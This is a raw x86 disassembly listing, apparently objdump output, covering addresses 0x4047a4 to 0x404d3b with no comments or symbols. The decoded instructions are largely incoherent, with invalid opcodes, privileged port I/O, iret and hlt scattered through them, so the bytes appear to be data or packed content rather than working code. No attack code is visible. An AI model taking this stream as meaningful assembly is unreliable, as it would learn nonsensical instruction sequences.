  4047a4:	69 68 0f eb b9 64 55 	imul   $0x5564b9eb,0xf(%eax),%ebp
  4047ab:	e3 2e                	jecxz  0x4047db
  4047ad:	4b                   	dec    %ebx
  4047ae:	30 ea                	xor    %ch,%dl
  4047b0:	58                   	pop    %eax
  4047b1:	08 e3                	or     %ah,%bl
  4047b3:	6d                   	insl   (%dx),%es:(%edi)
  4047b4:	49                   	dec    %ecx
  4047b5:	ed                   	in     (%dx),%eax
  4047b6:	48                   	dec    %eax
  4047b7:	40                   	inc    %eax
  4047b8:	da 35 0f b2 41 eb    	fidivl 0xeb41b20f
  4047be:	64 cf                	fs iret
  4047c0:	99                   	cltd
  4047c1:	9f                   	lahf
  4047c2:	e5 fc                	in     $0xfc,%eax
  4047c4:	b3 55                	mov    $0x55,%bl
  4047c6:	95                   	xchg   %eax,%ebp
  4047c7:	28 97 4a eb a6 a4    	sub    %dl,-0x5b5914b6(%edi)
  4047cd:	a2 69 bf bd 68       	mov    %al,0x68bdbf69
  4047d2:	d8 73 d9             	fdivs  -0x27(%ebx)
  4047d5:	ee                   	out    %al,(%dx)
  4047d6:	19 c0                	sbb    %eax,%eax
  4047d8:	2c bf                	sub    $0xbf,%al
  4047da:	7e 45                	jle    0x404821
  4047dc:	03 a8 a6 6f f3 75    	add    0x75f36fa6(%eax),%ebp
  4047e2:	4e                   	dec    %esi
  4047e3:	21 df                	and    %ebx,%edi
  4047e5:	a2 ea e3 12 16       	mov    %al,0x1612e3ea
  4047ea:	12 58 58             	adc    0x58(%eax),%bl
  4047ed:	db 73 01             	(bad) 0x1(%ebx)
  4047f0:	ff 01                	incl   (%ecx)
  4047f2:	af                   	scas   %es:(%edi),%eax
  4047f3:	6b 6b 5f c5          	imul   $0xffffffc5,0x5f(%ebx),%ebp
  4047f7:	ff 10                	call   *(%eax)
  4047f9:	10 02                	adc    %al,(%edx)
  4047fb:	50                   	push   %eax
  4047fc:	9a 06 21 87 3c b0 a8 	lcall  $0xa8b0,$0x3c872106
  404803:	2e 8b 3e             	mov    %cs:(%esi),%edi
  404806:	72 ee                	jb     0x4047f6
  404808:	55                   	push   %ebp
  404809:	6a c7                	push   $0xffffffc7
  40480b:	74 31                	je     0x40483e
  40480d:	da 6a 2d             	fisubrl 0x2d(%edx)
  404810:	13 dd                	adc    %ebp,%ebx
  404812:	67 69 e1 02 cf 9b 0d 	addr16 imul $0xd9bcf02,%ecx,%esp
  404819:	e6 a9                	out    %al,$0xa9
  40481b:	7b 44                	jnp    0x404861
  40481d:	b3 3e                	mov    $0x3e,%bl
  40481f:	dd cf                	(bad)
  404821:	16                   	push   %ss
  404822:	ff 2f                	ljmp   *(%edi)
  404824:	3e d9 df             	ds (bad)
  404827:	1a 2f                	sbb    (%edi),%ch
  404829:	da b1 a8 5e e0 5e    	fidivl 0x5ee05ea8(%ecx)
  40482f:	30 44 55 df          	xor    %al,-0x21(%ebp,%edx,2)
  404833:	00 59 e7             	add    %bl,-0x19(%ecx)
  404836:	20 79 1f             	and    %bh,0x1f(%ecx)
  404839:	53                   	push   %ebx
  40483a:	1c fe                	sbb    $0xfe,%al
  40483c:	63 51 c6             	arpl   %edx,-0x3a(%ecx)
  40483f:	77 ca                	ja     0x40480b
  404841:	be 0c 45 e7 4b       	mov    $0x4be7450c,%esi
  404846:	f2 0e                	repnz push %cs
  404848:	8c d2                	mov    %ss,%edx
  40484a:	b1 48                	mov    $0x48,%cl
  40484c:	16                   	push   %ss
  40484d:	0f c0 94 e2 bf db 90 	xadd   %dl,0x6290dbbf(%edx,%eiz,8)
  404854:	62 
  404855:	9a f8 6d 88 66 f3 22 	lcall  $0x22f3,$0x66886df8
  40485c:	cc                   	int3
  40485d:	ef                   	out    %eax,(%dx)
  40485e:	20 fd                	and    %bh,%ch
  404860:	b2 50                	mov    $0x50,%dl
  404862:	53                   	push   %ebx
  404863:	cd fb                	int    $0xfb
  404865:	86 a8 4d b4 a6 cb    	xchg   %ch,-0x34594bb3(%eax)
  40486b:	09 cd                	or     %ecx,%ebp
  40486d:	a2 91 f2 43 69       	mov    %al,0x6943f291
  404872:	54                   	push   %esp
  404873:	ff 22                	jmp    *(%edx)
  404875:	5c                   	pop    %esp
  404876:	46                   	inc    %esi
  404877:	d5 79                	aad    $0x79
  404879:	58                   	pop    %eax
  40487a:	5f                   	pop    %edi
  40487b:	41                   	inc    %ecx
  40487c:	6a d6                	push   $0xffffffd6
  40487e:	3c 88                	cmp    $0x88,%al
  404880:	c3                   	ret
  404881:	2b 48 8f             	sub    -0x71(%eax),%ecx
  404884:	7d 62                	jge    0x4048e8
  404886:	00 ec                	add    %ch,%ah
  404888:	b8 3e 06 29 49       	mov    $0x4929063e,%eax
  40488d:	94                   	xchg   %eax,%esp
  40488e:	0c 0d                	or     $0xd,%al
  404890:	a2 e4 9e 1d 83       	mov    %al,0x831d9ee4
  404895:	32 d6                	xor    %dh,%dl
  404897:	07                   	pop    %es
  404898:	49                   	dec    %ecx
  404899:	a9 a2 16 9d 53       	test   $0x539d16a2,%eax
  40489e:	24 2c                	and    $0x2c,%al
  4048a0:	6c                   	insb   (%dx),%es:(%edi)
  4048a1:	20 88 2e 83 59 90    	and    %cl,-0x6fa67cd2(%eax)
  4048a7:	bf 70 04 4a 01       	mov    $0x14a0470,%edi
  4048ac:	46                   	inc    %esi
  4048ad:	03 ff                	add    %edi,%edi
  4048af:	44                   	inc    %esp
  4048b0:	cd e3                	int    $0xe3
  4048b2:	64 37                	fs aaa
  4048b4:	09 fa                	or     %edi,%edx
  4048b6:	ec                   	in     (%dx),%al
  4048b7:	a3 7b 9c 3e 50       	mov    %eax,0x503e9c7b
  4048bc:	c9                   	leave
  4048bd:	ad                   	lods   %ds:(%esi),%eax
  4048be:	e3 ce                	jecxz  0x40488e
  4048c0:	4b                   	dec    %ebx
  4048c1:	33 0e                	xor    (%esi),%ecx
  4048c3:	9d                   	popf
  4048c4:	00 0b                	add    %cl,(%ebx)
  4048c6:	03 c0                	add    %eax,%eax
  4048c8:	9b                   	fwait
  4048c9:	c7                   	(bad)
  4048ca:	a1 8f 33 b1 03       	mov    0x3b1338f,%eax
  4048cf:	59                   	pop    %ecx
  4048d0:	41                   	inc    %ecx
  4048d1:	94                   	xchg   %eax,%esp
  4048d2:	d7                   	xlat   %ds:(%ebx)
  4048d3:	69 a9 15 e9 93 2b dd 	imul   $0xa9f4ebdd,0x2b93e915(%ecx),%ebp
  4048da:	eb f4 a9 
  4048dd:	c0 09 5f             	rorb   $0x5f,(%ecx)
  4048e0:	10 5b 74             	adc    %bl,0x74(%ebx)
  4048e3:	fb                   	sti
  4048e4:	08 94 13 a0 1b 25 9f 	or     %dl,-0x60dae460(%ebx,%edx,1)
  4048eb:	90                   	nop
  4048ec:	b9 2b ec 0d 4a       	mov    $0x4a0dec2b,%ecx
  4048f1:	03 01                	add    (%ecx),%eax
  4048f3:	88 01                	mov    %al,(%ecx)
  4048f5:	2a 01                	sub    (%ecx),%al
  4048f7:	07                   	pop    %es
  4048f8:	1c 9f                	sbb    $0x9f,%al
  4048fa:	f4                   	hlt
  4048fb:	1b 1c 18             	sbb    (%eax,%ebx,1),%ebx
  4048fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4048ff:	34 85                	xor    $0x85,%al
  404901:	2b 1c fa             	sub    (%edx,%edi,8),%ebx
  404904:	74 04                	je     0x40490a
  404906:	f0 00 63 31          	lock add %ah,0x31(%ebx)
  40490a:	6c                   	insb   (%dx),%es:(%edi)
  40490b:	41                   	inc    %ecx
  40490c:	04 bd                	add    $0xbd,%al
  40490e:	40                   	inc    %eax
  40490f:	ec                   	in     (%dx),%al
  404910:	bc 1e 0b 61 e1       	mov    $0xe1610b1e,%esp
  404915:	e8 02 98 e5 d3       	call   0xd425e11c
  40491a:	f2 59                	repnz pop %ecx
  40491c:	e0 e4                	loopne 0x404902
  40491e:	f8                   	clc
  40491f:	c3                   	ret
  404920:	be 2c 8f fc b0       	mov    $0xb0fc8f2c,%esi
  404925:	58                   	pop    %eax
  404926:	96                   	xchg   %eax,%esi
  404927:	9d                   	popf
  404928:	b8 a0 64 d7 a2       	mov    $0xa2d764a0,%eax
  40492d:	e7 10                	out    %eax,$0x10
  40492f:	01 ff                	add    %edi,%edi
  404931:	20 32                	and    %dh,(%edx)
  404933:	f6 6a 04             	imulb  0x4(%edx)
  404936:	82 c5 03             	add    $0x3,%ch
  404939:	60                   	pusha
  40493a:	cc                   	int3
  40493b:	b7 40                	mov    $0x40,%bh
  40493d:	ea 38 2e ec 1e 2f 2f 	ljmp   $0x2f2f,$0x1eec2e38
  404944:	f9                   	stc
  404945:	06                   	push   %es
  404946:	f3 ce                	repz into
  404948:	eb 3c                	jmp    0x404986
  40494a:	01 d4                	add    %edx,%esp
  40494c:	0c 17                	or     $0x17,%al
  40494e:	e3 98                	jecxz  0x4048e8
  404950:	b8 ce e4 30 fd       	mov    $0xfd30e4ce,%eax
  404955:	3c ab                	cmp    $0xab,%al
  404957:	f3 ac                	rep lods %ds:(%esi),%al
  404959:	18 dc                	sbb    %bl,%ah
  40495b:	30 fd                	xor    %bh,%ch
  40495d:	97                   	xchg   %eax,%edi
  40495e:	eb 3c                	jmp    0x40499c
  404960:	eb 02                	jmp    0x404964
  404962:	f0 b4 5f             	lock mov $0x5f,%ah
  404965:	c0 61 34 dc          	shlb   $0xdc,0x34(%ecx)
  404969:	e7 49                	out    %eax,$0x49
  40496b:	51                   	push   %ecx
  40496c:	07                   	pop    %es
  40496d:	6f                   	outsl  %ds:(%esi),(%dx)
  40496e:	59                   	pop    %ecx
  40496f:	bc a4 c3 09 04       	mov    $0x409c3a4,%esp
  404974:	fc                   	cld
  404975:	ef                   	out    %eax,(%dx)
  404976:	a2 d8 6b 3c 0e       	mov    %al,0xe3c6bd8
  40497b:	0f 0b                	ud2
  40497d:	f4                   	hlt
  40497e:	67 a4                	movsb  %ds:(%si),%es:(%di)
  404980:	6b b0 a4 f7 3c cf f3 	imul   $0xfffffff3,-0x30c3085c(%eax),%esi
  404987:	bc d4 e0 ec 73       	mov    $0x73ece0d4,%esp
  40498c:	02 0c 7d f8 6b ff 28 	add    0x28ff6bf8(,%edi,2),%cl
  404993:	d4 fe                	aam    $0xfe
  404995:	89 1f                	mov    %ebx,(%edi)
  404997:	09 eb                	or     %ebp,%ebx
  404999:	15 b0 c4 67 8f       	adc    $0x8f67c4b0,%eax
  40499e:	8d a7 d0 a1 1a 56    	lea    0x561aa1d0(%edi),%esp
  4049a4:	fa                   	cli
  4049a5:	38 01                	cmp    %al,(%ecx)
  4049a7:	90                   	nop
  4049a8:	70 be                	jo     0x404968
  4049aa:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4049ab:	04 36                	add    $0x36,%al
  4049ad:	3e 7e dc             	jle,pt 0x40498c
  4049b0:	bf 0e c4 b8 21       	mov    $0x21b8c40e,%edi
  4049b5:	ef                   	out    %eax,(%dx)
  4049b6:	f0 1d 44 b9 d4 00    	lock sbb $0xd4b944,%eax
  4049bc:	2d 1d b7 bf 09       	sub    $0x9bfb71d,%eax
  4049c1:	cf                   	iret
  4049c2:	7d 7f                	jge    0x404a43
  4049c4:	17                   	pop    %ss
  4049c5:	fc                   	cld
  4049c6:	77 bc                	ja     0x404984
  4049c8:	e3 fb                	jecxz  0x4049c5
  4049ca:	40                   	inc    %eax
  4049cb:	58                   	pop    %eax
  4049cc:	2f                   	das
  4049cd:	85 a7 09 15 17 8c    	test   %esp,-0x73e8eaf7(%edi)
  4049d3:	bf 85 f7 85 df       	mov    $0xdf85f785,%edi
  4049d8:	7c bb                	jl     0x404995
  4049da:	18 b9 0d a9 e3 ff    	sbb    %bh,-0x1c56f3(%ecx)
  4049e0:	94                   	xchg   %eax,%esp
  4049e1:	61                   	popa
  4049e2:	e4 c6                	in     $0xc6,%al
  4049e4:	00 05 4b 0a 80 1a    	add    %al,0x1a800a4b
  4049ea:	82 16 fe             	adcb   $0xfe,(%esi)
  4049ed:	54                   	push   %esp
  4049ee:	08 10                	or     %dl,(%eax)
  4049f0:	f5                   	cmc
  4049f1:	2c d2                	sub    $0xd2,%al
  4049f3:	b2 62                	mov    $0x62,%dl
  4049f5:	0a c9                	or     %cl,%cl
  4049f7:	38 a0 73 3c 14 ad    	cmp    %ah,-0x52ebc38d(%eax)
  4049fd:	53                   	push   %ebx
  4049fe:	f9                   	stc
  4049ff:	47                   	inc    %edi
  404a00:	62 89 09 96 24 b3    	bound  %ecx,-0x4cdb69f7(%ecx)
  404a06:	ce                   	into
  404a07:	a3 b9 07 9c e5       	mov    %eax,0xe59c07b9
  404a0c:	de 46 70             	fiadds 0x70(%esi)
  404a0f:	22 fc                	and    %ah,%bh
  404a11:	94                   	xchg   %eax,%esp
  404a12:	08 0a                	or     %cl,(%edx)
  404a14:	22 96 7d 9b f3 3c    	and    0x3cf39b7d(%esi),%dl
  404a1a:	99                   	cltd
  404a1b:	e0 b6                	loopne 0x4049d3
  404a1d:	14 7a                	adc    $0x7a,%al
  404a1f:	28 5c fc f6          	sub    %bl,-0xa(%esp,%edi,8)
  404a23:	6c                   	insb   (%dx),%es:(%edi)
  404a24:	ff 54 8a 77          	call   *0x77(%edx,%ecx,4)
  404a28:	24 fd                	and    $0xfd,%al
  404a2a:	95                   	xchg   %eax,%ebp
  404a2b:	7e 37                	jle    0x404a64
  404a2d:	02 a2 6b 08 49 f6    	add    -0x9b6f795(%edx),%ah
  404a33:	b9 d1 28 10 d6       	mov    $0xd61028d1,%ecx
  404a38:	65 e5 43             	gs in  $0x43,%eax
  404a3b:	01 5b ab             	add    %ebx,-0x55(%ebx)
  404a3e:	5e                   	pop    %esi
  404a3f:	37                   	aaa
  404a40:	02 56 44             	add    0x44(%esi),%dl
  404a43:	6b ab 2d 36 e8 09 ee 	imul   $0xffffffee,0x9e8362d(%ebx),%ebp
  404a4a:	1b fd                	sbb    %ebp,%edi
  404a4c:	1d 08 01 ca c1       	sbb    $0xc1ca0108,%eax
  404a51:	d8 58 fe             	fcomps -0x2(%eax)
  404a54:	9a 68 ff 09 01 03 c0 	lcall  $0xc003,$0x109ff68
  404a5b:	00 b3 60 31 78 ff    	add    %dh,-0x87cea0(%ebx)
  404a61:	8d 90 af c0 2f 10    	lea    0x102fc0af(%eax),%edx
  404a67:	44                   	inc    %esp
  404a68:	69 58 5a ef 7d f3 58 	imul   $0x58f37def,0x5a(%eax),%ebx
  404a6f:	2c a4                	sub    $0xa4,%al
  404a71:	9f                   	lahf
  404a72:	05 7c 01 d5 65       	add    $0x65d5017c,%eax
  404a77:	d3 2d 18 dd b2 fe    	shrl   %cl,0xfeb2dd18
  404a7d:	04 10                	add    $0x10,%al
  404a7f:	4e                   	dec    %esi
  404a80:	ec                   	in     (%dx),%al
  404a81:	4e                   	dec    %esi
  404a82:	37                   	aaa
  404a83:	17                   	pop    %ss
  404a84:	6c                   	insb   (%dx),%es:(%edi)
  404a85:	b7 20                	mov    $0x20,%bh
  404a87:	17                   	pop    %ss
  404a88:	70 fd                	jo     0x404a87
  404a8a:	9c                   	pushf
  404a8b:	74 ff                	je     0x404a8c
  404a8d:	05 24 84 45 e0       	add    $0xe0458424,%eax
  404a92:	05 0d 9d 4b 9e       	add    $0x9e4b9d0d,%eax
  404a97:	13 1a                	adc    (%edx),%ebx
  404a99:	74 13                	je     0x404aae
  404a9b:	fd                   	std
  404a9c:	38 91 ae 08 2c f2    	cmp    %dl,-0xdd3f752(%ecx)
  404aa2:	53                   	push   %ebx
  404aa3:	1d 00 03 e1 c6       	sbb    $0xc6e10300,%eax
  404aa8:	25 76 6c 47 ec       	and    $0xec476c76,%eax
  404aad:	b8 ea 3a bf 2c       	mov    $0x2cbf3aea,%eax
  404ab2:	b2 70                	mov    $0x70,%dl
  404ab4:	58                   	pop    %eax
  404ab5:	1c 68                	sbb    $0x68,%al
  404ab7:	4d                   	dec    %ebp
  404ab8:	04 fc                	add    $0xfc,%al
  404aba:	99                   	cltd
  404abb:	41                   	inc    %ecx
  404abc:	2e 85 e3             	cs test %esp,%ebx
  404abf:	d9 98 00 9a 45 51    	fstps  0x51459a00(%eax)
  404ac5:	0a 87 61 79 42 50    	or     0x50427961(%edi),%al
  404acb:	51                   	push   %ecx
  404acc:	4d                   	dec    %ebp
  404acd:	79 90                	jns    0x404a5f
  404acf:	87 f2                	xchg   %esi,%edx
  404ad1:	1c 50                	sbb    $0x50,%al
  404ad3:	68 30 5d 2d bc       	push   $0xbc2d5d30
  404ad8:	62 61 73             	bound  %esp,0x73(%ecx)
  404adb:	a3 c7 b0 a5 69       	mov    %eax,0x69a5b0c7
  404ae0:	74 18                	je     0x404afa
  404ae2:	4e                   	dec    %esi
  404ae3:	67 bd 1f 10 cb 76    	addr16 mov $0x76cb101f,%ebp
  404ae9:	36 cf                	ss iret
  404aeb:	4c                   	dec    %esp
  404aec:	8f                   	(bad)
  404aed:	9e                   	sahf
  404aee:	67 a0 02 14          	addr16 mov 0x1402,%al
  404af2:	4c                   	dec    %esp
  404af3:	fd                   	std
  404af4:	3b cf                	cmp    %edi,%ecx
  404af6:	10 30                	adc    %dh,(%eax)
  404af8:	0c a0                	or     $0xa0,%al
  404afa:	72 06                	jb     0x404b02
  404afc:	1b db                	sbb    %ebx,%ebx
  404afe:	26 d4 31             	es aam $0x31
  404b01:	09 fc                	or     %edi,%esp
  404b03:	f8                   	clc
  404b04:	c9                   	leave
  404b05:	20 f7                	and    %dh,%bh
  404b07:	20 1b                	and    %bl,(%ebx)
  404b09:	00 2d 24 8b 2a 46    	add    %ch,0x462a8b24
  404b0f:	25 08 fe 98 12       	and    $0x1298fe08,%eax
  404b14:	5a                   	pop    %edx
  404b15:	f7 5e 0b             	negl   0xb(%esi)
  404b18:	14 e0                	adc    $0xe0,%al
  404b1a:	39 8c 6c 4a db 34 b7 	cmp    %ecx,-0x48cb24b6(%esp,%ebp,2)
  404b21:	4e                   	dec    %esi
  404b22:	f6 fb                	idiv   %bl
  404b24:	03 f7                	add    %edi,%esi
  404b26:	79 f7                	jns    0x404b1f
  404b28:	f1                   	int1
  404b29:	10 11                	adc    %dl,(%ecx)
  404b2b:	d7                   	xlat   %ds:(%ebx)
  404b2c:	79 f7                	jns    0x404b25
  404b2e:	79 0f                	jns    0x404b3f
  404b30:	0d 9b be 81 f3       	or     $0xf381be9b,%eax
  404b35:	d6                   	salc
  404b36:	ef                   	out    %eax,(%dx)
  404b37:	10 5f 0c             	adc    %bl,0xc(%edi)
  404b3a:	08 95 61 7c 10 6c    	or     %dl,0x6c107c61(%ebp)
  404b40:	93                   	xchg   %eax,%ebx
  404b41:	08 40 c2             	or     %al,-0x3e(%eax)
  404b44:	9b                   	fwait
  404b45:	68 de 02 e8 1b       	push   $0x1be802de
  404b4a:	99                   	cltd
  404b4b:	37                   	aaa
  404b4c:	00 0c 7b             	add    %cl,(%ebx,%edi,2)
  404b4f:	59                   	pop    %ecx
  404b50:	d9 8d 3c ee fc e6    	(bad) -0x190311c4(%ebp)
  404b56:	b5 0f                	mov    $0xf,%ch
  404b58:	88 1a                	mov    %bl,(%edx)
  404b5a:	97                   	xchg   %eax,%edi
  404b5b:	f9                   	stc
  404b5c:	1c a2                	sbb    $0xa2,%al
  404b5e:	6c                   	insb   (%dx),%es:(%edi)
  404b5f:	c1 74 f4 00 e7       	shll   $0xe7,0x0(%esp,%esi,8)
  404b64:	f5                   	cmc
  404b65:	5e                   	pop    %esi
  404b66:	dd 32                	fnsave (%edx)
  404b68:	f2 27                	repnz daa
  404b6a:	71 87                	jno    0x404af3
  404b6c:	5e                   	pop    %esi
  404b6d:	0c 0b                	or     $0xb,%al
  404b6f:	3c 6c                	cmp    $0x6c,%al
  404b71:	71 8b                	jno    0x404afe
  404b73:	8a 65 cc             	mov    -0x34(%ebp),%ah
  404b76:	f5                   	cmc
  404b77:	6c                   	insb   (%dx),%es:(%edi)
  404b78:	b2 7a                	mov    $0x7a,%dl
  404b7a:	32 24 0a             	xor    (%edx,%ecx,1),%ah
  404b7d:	01 0b                	add    %ecx,(%ebx)
  404b7f:	e4 8e                	in     $0x8e,%al
  404b81:	46                   	inc    %esi
  404b82:	ca 02 0c             	lret   $0xc02
  404b85:	73 03                	jae    0x404b8a
  404b87:	f4                   	hlt
  404b88:	14 bb                	adc    $0xbb,%al
  404b8a:	0b 32                	or     (%edx),%esi
  404b8c:	54                   	push   %esp
  404b8d:	04 a7                	add    $0xa7,%al
  404b8f:	67 44                	addr16 inc %esp
  404b91:	3f                   	aas
  404b92:	b7 5f                	mov    $0x5f,%bh
  404b94:	c3                   	ret
  404b95:	ab                   	stos   %eax,%es:(%edi)
  404b96:	3a fb                	cmp    %bl,%bh
  404b98:	b3 0d                	mov    $0xd,%bl
  404b9a:	0e                   	push   %cs
  404b9b:	48                   	dec    %eax
  404b9c:	27                   	daa
  404b9d:	8c 5f e4             	mov    %ds,-0x1c(%edi)
  404ba0:	2b 76 27             	sub    0x27(%esi),%esi
  404ba3:	37                   	aaa
  404ba4:	d6                   	salc
  404ba5:	16                   	push   %ss
  404ba6:	ca 28 3a             	lret   $0x3a28
  404ba9:	7b 5b                	jnp    0x404c06
  404bab:	dc 2f                	fsubrl (%edi)
  404bad:	78 29                	js     0x404bd8
  404baf:	b0 10                	mov    $0x10,%al
  404bb1:	e8 a6 20 d4 ff       	call   0x146c5c
  404bb6:	1c d9                	sbb    $0xd9,%al
  404bb8:	04 2c                	add    $0x2c,%al
  404bba:	0f d5 3b             	pmullw (%ebx),%mm7
  404bbd:	0b 13                	or     (%ebx),%edx
  404bbf:	23 85 40 8d 90 1b    	and    0x1b908d40(%ebp),%eax
  404bc5:	19 fd                	sbb    %edi,%ebp
  404bc7:	c7                   	(bad)
  404bc8:	9b                   	fwait
  404bc9:	48                   	dec    %eax
  404bca:	6d                   	insl   (%dx),%es:(%edi)
  404bcb:	c2 1b 1a             	ret    $0x1a1b
  404bce:	b2 20                	mov    $0x20,%dl
  404bd0:	9c                   	pushf
  404bd1:	83 70 1b 1b          	xorl   $0x1b,0x1b(%eax)
  404bd5:	7b 41                	jnp    0x404c18
  404bd7:	38 07                	cmp    %al,(%edi)
  404bd9:	74 0a                	je     0x404be5
  404bdb:	1c ce                	sbb    $0xce,%al
  404bdd:	72 e1                	jb     0x404bc0
  404bdf:	c5 32                	lds    (%edx),%esi
  404be1:	08 67 0c             	or     %ah,0xc(%edi)
  404be4:	e4 b1                	in     $0xb1,%al
  404be6:	14 01                	adc    $0x1,%al
  404be8:	af                   	scas   %es:(%edi),%eax
  404be9:	93                   	xchg   %eax,%ebx
  404bea:	d5 b2                	aad    $0xb2
  404bec:	08 38                	or     %bh,(%eax)
  404bee:	51                   	push   %ecx
  404bef:	e1 54                	loope  0x404c45
  404bf1:	79 1c                	jns    0x404c0f
  404bf3:	00 cf                	add    %cl,%bh
  404bf5:	61                   	popa
  404bf6:	d9 3a                	fnstcw (%edx)
  404bf8:	74 70                	je     0x404c6a
  404bfa:	2f                   	das
  404bfb:	5a                   	pop    %edx
  404bfc:	2b 3c 6c             	sub    (%esp,%ebp,2),%edi
  404bff:	04 64                	add    $0x64,%al
  404c01:	ff 05 07 86 0c c5    	incl   0xc50c8607
  404c07:	e2 0d                	loop   0x404c16
  404c09:	14 da                	adc    $0xda,%al
  404c0b:	4c                   	dec    %esp
  404c0c:	b3 90                	mov    $0x90,%bl
  404c0e:	08 ba c5 fc 0a 01    	or     %bh,0x10afcc5(%edx)
  404c14:	0a 6c 39 f1          	or     -0xf(%ecx,%edi,1),%ch
  404c18:	50                   	push   %eax
  404c19:	16                   	push   %ss
  404c1a:	05 20 0d 5e 21       	add    $0x215e0d20,%eax
  404c1f:	0c 97                	or     $0x97,%al
  404c21:	1d 63 71 60 af       	sbb    $0xaf607163,%eax
  404c26:	84 f0                	test   %dh,%al
  404c28:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404c29:	1a 68 5e             	sbb    0x5e(%eax),%ch
  404c2c:	26 c9                	es leave
  404c2e:	24 e7                	and    $0xe7,%al
  404c30:	95                   	xchg   %eax,%ebp
  404c31:	2c 27                	sub    $0x27,%al
  404c33:	08 44 3a 7e          	or     %al,0x7e(%edx,%edi,1)
  404c37:	9d                   	popf
  404c38:	f9                   	stc
  404c39:	03 82 1b ba c5 0d    	add    0xdc5ba1b(%edx),%eax
  404c3f:	04 0a                	add    $0xa,%al
  404c41:	0f 8a 31 e0 58 35    	jp     0x35992c78
  404c47:	00 07                	add    %al,(%edi)
  404c49:	10 3c 07             	adc    %bh,(%edi,%eax,1)
  404c4c:	56                   	push   %esi
  404c4d:	f8                   	clc
  404c4e:	f1                   	int1
  404c4f:	74 55                	je     0x404ca6
  404c51:	0b 28                	or     (%eax),%ebp
  404c53:	4c                   	dec    %esp
  404c54:	8c e8                	mov    %gs,%eax
  404c56:	2d cc fc f6 5c       	sub    $0x5cf6fccc,%eax
  404c5b:	0a 54 49 1e          	or     0x1e(%ecx,%ecx,2),%dl
  404c5f:	39 c6                	cmp    %eax,%esi
  404c61:	fc                   	cld
  404c62:	c8 82 3c fd          	enter  $0x3c82,$0xfd
  404c66:	a3 30 e6 1f fa       	mov    %eax,0xfa1fe630
  404c6b:	7d 00                	jge    0x404c6d
  404c6d:	5c                   	pop    %esp
  404c6e:	6c                   	insb   (%dx),%es:(%edi)
  404c6f:	93                   	xchg   %eax,%ebx
  404c70:	4b                   	dec    %ebx
  404c71:	de 39                	fidivrs (%ecx)
  404c73:	1e                   	push   %ds
  404c74:	53                   	push   %ebx
  404c75:	bc d1 d0 00 20       	mov    $0x2000d0d1,%esp
  404c7a:	b5 1d                	mov    $0x1d,%ch
  404c7c:	d2 9b cf 60 d4 39    	rcrb   %cl,0x39d460cf(%ebx)
  404c82:	48                   	dec    %eax
  404c83:	27                   	daa
  404c84:	b2 45                	mov    $0x45,%dl
  404c86:	5f                   	pop    %edi
  404c87:	16                   	push   %ss
  404c88:	15 9d 82 19 a3       	adc    $0xa319829d,%eax
  404c8d:	0a 17                	or     (%edi),%dl
  404c8f:	f0 85 83 19 18 68 f3 	lock test %eax,-0xc97e7e7(%ebx)
  404c96:	af                   	scas   %es:(%edi),%eax
  404c97:	a3 c6 c1 48 18       	mov    %eax,0x1848c1c6
  404c9c:	eb c0                	jmp    0x404c5e
  404c9e:	bc 58 7c bd 6b       	mov    $0x6bbd7c58,%esp
  404ca3:	fe                   	(bad)
  404ca4:	1d 4d c3 4d 67       	sbb    $0x674dc34d,%eax
  404ca9:	38 1e                	cmp    %bl,(%esi)
  404cab:	72 0d                	jb     0x404cba
  404cad:	21 43 8f             	and    %eax,-0x71(%ebx)
  404cb0:	aa                   	stos   %al,%es:(%edi)
  404cb1:	07                   	pop    %es
  404cb2:	91                   	xchg   %eax,%ecx
  404cb3:	1b 36                	sbb    (%esi),%esi
  404cb5:	37                   	aaa
  404cb6:	32 56 ad             	xor    -0x53(%esi),%dl
  404cb9:	b3 0a                	mov    $0xa,%bl
  404cbb:	1e                   	push   %ds
  404cbc:	90                   	nop
  404cbd:	dd 6b 04             	(bad) 0x4(%ebx)
  404cc0:	e7 7d                	out    %eax,$0x7d
  404cc2:	0f e2 40 20          	psrad  0x20(%eax),%mm0
  404cc6:	e6 51                	out    %al,$0x51
  404cc8:	76 67                	jbe    0x404d31
  404cca:	05 68 c3 f4 30       	add    $0x30f4c368,%eax
  404ccf:	ad                   	lods   %ds:(%esi),%eax
  404cd0:	ec                   	in     (%dx),%al
  404cd1:	61                   	popa
  404cd2:	fa                   	cli
  404cd3:	e5 02                	in     $0x2,%eax
  404cd5:	f3 ea fc ef 2b 00 6a 	repz ljmp $0x196a,$0x2beffc
  404cdc:	19 
  404cdd:	b4 ab                	mov    $0xab,%ah
  404cdf:	b3 a3                	mov    $0xa3,%bl
  404ce1:	a1 41 00 01 e2       	mov    0xe2010041,%eax
  404ce6:	c5 30                	lds    (%eax),%esi
  404ce8:	aa                   	stos   %al,%es:(%edi)
  404ce9:	1f                   	pop    %ds
  404cea:	6c                   	insb   (%dx),%es:(%edi)
  404ceb:	10 54 59 82          	adc    %dl,-0x7e(%ecx,%ebx,2)
  404cef:	c6 02 40             	movb   $0x40,(%edx)
  404cf2:	3a 38                	cmp    (%eax),%bh
  404cf4:	8d 90 b1 b4 03 9e    	lea    -0x61fc4b4f(%eax),%edx
  404cfa:	96                   	xchg   %eax,%esi
  404cfb:	45                   	inc    %ebp
  404cfc:	04 14                	add    $0x14,%al
  404cfe:	43                   	inc    %ebx
  404cff:	31 8e 22 4c cf 41    	xor    %ecx,0x41cf4c22(%esi)
  404d05:	7e df                	jle    0x404ce6
  404d07:	22 95 46 96 19 1b    	and    0x1b199646(%ebp),%dl
  404d0d:	44                   	inc    %esp
  404d0e:	c0 2a c2             	shrb   $0xc2,(%edx)
  404d11:	87 23                	xchg   %esp,(%ebx)
  404d13:	7c 01                	jl     0x404d16
  404d15:	de 04 f4             	fiadds (%esp,%esi,8)
  404d18:	02 f4                	add    %ah,%dh
  404d1a:	5d                   	pop    %ebp
  404d1b:	20 02                	and    %al,(%edx)
  404d1d:	32 04 08             	xor    (%eax,%ecx,1),%al
  404d20:	b4 e0                	mov    $0xe0,%ah
  404d22:	5c                   	pop    %esp
  404d23:	00 0e                	add    %cl,(%esi)
  404d25:	d8 0b                	fmuls  (%ebx)
  404d27:	10 4d 06             	adc    %cl,0x6(%ebp)
  404d2a:	68 00 ff 18 7b       	push   $0x7b18ff00
  404d2f:	fb                   	sti
  404d30:	64 b8 59 11 bc 00    	fs mov $0xbc1159,%eax
  404d36:	01 3a                	add    %edi,(%edx)
  404d38:	ca 62 fc             	lret   $0xfc62
  404d3b:	77 fd                	ja     0x404d3a
